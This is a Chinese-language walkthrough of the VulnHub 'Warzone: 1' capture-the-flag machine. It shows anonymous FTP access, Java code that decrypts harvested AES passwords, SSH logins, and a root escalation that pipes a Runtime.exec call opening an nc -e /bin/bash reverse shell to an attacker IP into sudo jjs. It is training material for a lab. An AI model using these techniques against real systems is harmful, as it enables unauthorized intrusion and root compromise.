> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JhaQqVJ3kPuZN2KzHASIfw)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/1brjUjbpg5woLxm1R7bkgS0xELvt3I75r1nOjBycGwcBqCoO4AtB7FQNfiasb7z3JWibPtaeZussh9jnKKmOECmg/640?wx_fmt=png)

点击上方 “信安前线” 可订阅

**0x01 介绍**
-----------

虚拟机页面：http://www.vulnhub.com/entry/warzone-1,589/

Description

```
Info : Created and Tested in Virtual Box, maybe you need to write code
Based on : Crypto
Scenario : You are trying to gain access to the enemy system
Mission : Your mission is to get the silver and the gold trophy (user.txt, root.txt)
Hints : java decompiler
```

**0x02 Writeup**
----------------

**主机发现和端口探测：**

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.7.3)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**服务脆弱性测试攻击：**

以匿名用户登录 ftp，发现了两个文件。  

```
kali@kali:~$ ftp 192.168.56.44
Connected to 192.168.56.44.
220 (vsFTPd 3.0.3)
Name (192.168.56.44:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    2 ftp      ftp          4096 Oct 22 12:49 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--r--r--    1 ftp      ftp            77 Oct 22 12:32 note.txt
-r--r--r--    1 ftp      ftp          5155 Oct 22 12:49 warzone-encrypt.jar
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (77 bytes).
226 Transfer complete.
77 bytes received in 0.00 secs (16.2304 kB/s)
ftp> get warzone-encrypt.jar
local: warzone-encrypt.jar remote: warzone-encrypt.jar
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for warzone-encrypt.jar (5155 bytes).
226 Transfer complete.
5155 bytes received in 0.01 secs (883.6545 kB/s)

kali@kali:~$ cat note.txt 
Attention, please encrypt always your password using the warzone-encrypt.jar
```

反编译 warzone-encrypt.jar，得知这段代码是 AES 加密字符串的。

```
package encrypt;

import crypto.AES;
import java.util.Scanner;

public class Main {
  public static void main(String[] args) {
    System.out.println("Symmetric Encryption by Alienum");
    Scanner in = new Scanner(System.in);
    System.out.print("enter the password to encrypt : ");
    String password = in.nextLine();
    System.out.println("encrypted password : " + AES.encryptString(password));
    System.exit(0);
  }
}
```

暂时先不管它，接下来查看 5000 服务，在页面源码下发现一段文字：GA DIE UHCEETASTTRNL，这是一种置换密码 - 栅栏密码，分三栏

得到请求路径 / get/auth/credentials，在该路径下得到加密信息。

Confidential

<table width="800"><thead><tr cid="n35" mdtype="table_row"><th>username</th><th>password</th></tr></thead><tbody><tr cid="n38" mdtype="table_row"><td>paratrooper</td><td>GJSFBy6jihz/GbfaeOiXwtqgHe1QutGVVFlyDXbxVRo=</td></tr><tr cid="n41" mdtype="table_row"><td>specops</td><td>mnKbQSV2k9UzJeTnJhoAyy4TqEryPw6ouANzIZMXF6Y=</td></tr><tr cid="n44" mdtype="table_row"><td>specforce</td><td>jiYMm39vW9pTr+6Z/6SafQ==</td></tr><tr cid="n47" mdtype="table_row"><td>aquaman</td><td>v9yjWjP7tKHLyt6ZCw5sxtktXIYm5ynlHmx+ZCI4OT4=</td></tr><tr cid="n50" mdtype="table_row"><td>commander</td><td>2czKTfl/n519Kw5Ze7mVy4BsdzdzCbpRY8+BQxqnsYg=</td></tr><tr cid="n53" mdtype="table_row"><td>commando</td><td>+uj9HGdnyJvkBagdB1i26M9QzsxKHUI0EFMhhfaqt2A=</td></tr><tr cid="n56" mdtype="table_row"><td>pathfinder</td><td>eTQiiMXzrM4MkSItWUegd1rZ/pOIU0JyWlLNw2oW6oo=</td></tr><tr cid="n59" mdtype="table_row"><td>ranger</td><td>BN5Syc7D7Bdj7utCbmBiT7pXU+bISYj33Qzf4CmIDs=</td></tr></tbody></table>

稍微改了上面的加密代码，其中 AES 中的几个属性改为 public（这里省略），得到解密口令，利用 ssh 尝试登录。

```
public class Test {

    public static String decrypt(String encryptpasswd) {
        Obfuscated obs = new Obfuscated();
        AES ea = new AES(obs.getIV(), 128, obs.getKey());
        try {
            ea.cipher.init(2, ea.key, ea.iv);
            byte[] encryptbytes = Base64.getDecoder().decode(encryptpasswd);
            byte[] decryptbytes = ea.cipher.doFinal(encryptbytes);
            return new String(decryptbytes);
        } catch (Exception ex) {
            throw new RuntimeException(ex.getMessage());
        }
    }

    public static void main(String[] args) {

        while (true) {
            Scanner in = new Scanner(System.in);
            System.out.print("enter the encryptpassword to decrypt : ");
            String encryptpassword = in.nextLine();
            System.out.println("password : " + decrypt(encryptpassword));
        }

    }
}
```

通过解密得到 commando 的密码为 c0mmandosArentRea1.!，ssh 成功登录 commando。

```
kali@kali:~$ ssh commando@192.168.56.44
+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+
   WARZONE    WARZONE    WARZONE    WARZONE    WARZONE    WARZONE
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                 {Unauthorized access is prohibited}
commando@192.168.56.44's password: 
Linux warzone 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64
+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++-+-+-+
   WARZONE    WARZONE    WARZONE    WARZONE    WARZONE    WARZONE
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                 {Unauthorized access is prohibited}
Last login: Mon Oct 26 06:51:30 2020 from 192.168.56.4
```

**提权获取 flag：**

查看. bash_history

```
cd captain
ls
cd Desktop
ls
cat user.txt
```

进入 / home/captain/Desktop

```
drwxr-xr-x  2 captain captain 4096 Oct 22 17:35 .crypt
-r--------  1 captain captain   32 Oct 21 18:23 user.txt
```

继续进入. crypt，readme.txt 提醒密码就在这里，还有一段加密程序 encrypt.py 和. c，简单写了解密程序得到 captain 密码为_us3rz0ne_F1RE

```
#!/usr/bin/python3
from simplecrypt import encrypt, decrypt
import os
import base64
key = 'sekret'
text = base64.b64decode('c2MAAk1Y/hAsEsn+FasElyXvGSI0JxD+n/SCtXbHNM+1/YEU54DO0EQRDfD3wz/lrbkXEBJJJd1ylXZpi/2dopaklmG6NCAXfGKl1eWAUNU1Iw==')
passwd = decrypt(key, text)
print(passwd)
```

**登录得到第一个 flag**

```
captain@warzone:~/Desktop$ cat user.txt 
trophy : {silver_medal_warzone}
```

查看 sudo -l 看到 jjs[2]（jjs 是让 javascript 可以调用 java）可以执行特权命令，通过下面命令成功获取 root shell（可以查看. bash_history 获得帮助）。

```
echo "Java.type('java.lang.Runtime').getRuntime().exec('/usr/bin/nc -e /bin/bash 192.168.56.4 8000')"|sudo jjs

# 返回shell
id
uid=0(root) gid=0(root) groups=0(root)
ls /root/Desktop
root.txt
cat root.txt
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
trophy : {gold_medal_warzone}
-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
created by @AL1ENUM with <3
```

**0x03 参考**
-----------

*   https://blog.csdn.net/roc1010/article/details/89605693
    
*   https://www.runoob.com/java/java8-nashorn-javascript.html
    

**PS：已授权，感谢大哥的文章**

更多精彩

*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
    
*   [vulnhub 之 IA: Nemesis (1.0.1) 靶场 Writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486886&idx=1&sn=41eea23641c906ed29288bcc8416664e&chksm=fcfc30f0cb8bb9e690c7630af7ed38980cfada4a5e6473b50abb34c1354dc85b2f86cfcadf65&scene=21#wechat_redirect)  
    
*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
    

![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)

**如果感觉文章不错，分享让更多的人知道吧！**